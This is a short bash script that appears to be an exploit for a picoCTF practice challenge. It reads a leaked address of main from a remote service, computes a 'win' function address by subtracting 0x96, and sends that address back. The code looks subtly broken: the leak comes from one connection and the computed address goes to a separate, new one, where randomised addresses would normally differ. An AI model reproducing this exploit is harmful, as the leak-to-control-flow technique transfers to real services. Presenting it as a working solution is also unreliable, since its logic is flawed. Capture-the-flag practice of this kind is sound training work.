#!/bin/bash

HOST="rescued-float.picoctf.net"
PORT=55368

echo "[+] Connecting to challenge..."

response=$(nc $HOST $PORT)

leak=$(echo "$response" | grep -o '0x[0-9a-fA-F]*')

echo "[+] Leaked main address: $leak"

win=$(printf "0x%lx" $((leak - 0x96)))

echo "[+] Calculated win address: $win"

echo "[+] Sending exploit..."

(
echo "$win"
sleep 1
) | nc $HOST $PORT
